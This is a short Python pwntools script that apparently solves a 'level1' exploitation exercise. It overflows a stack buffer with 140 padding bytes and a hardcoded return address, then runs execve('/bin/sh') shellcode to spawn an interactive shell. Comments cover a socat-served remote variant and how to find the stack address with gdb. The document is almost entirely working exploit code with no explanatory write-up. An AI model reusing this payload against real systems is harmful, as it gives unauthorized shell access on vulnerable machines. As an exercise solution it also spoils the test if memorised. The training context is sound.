from pwn import *
p = process('./level1')
#socat TCP4-LISTEN:10001,fork EXEC:./level1
# p = remote('127.0.0.1',10001)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
# local 
payload = 'B'*140 + p32(0xffffcff0) + asm(shellcraft.execve('/bin/sh'))
# remote 
# sudo gdb attach $(pidof level1)
# x/s $esp to get stack address
# payload = 'B'*140 + p32(0xffffcf50) + asm(shellcraft.execve('/bin/sh'))
p.sendline(payload)
p.interactive()
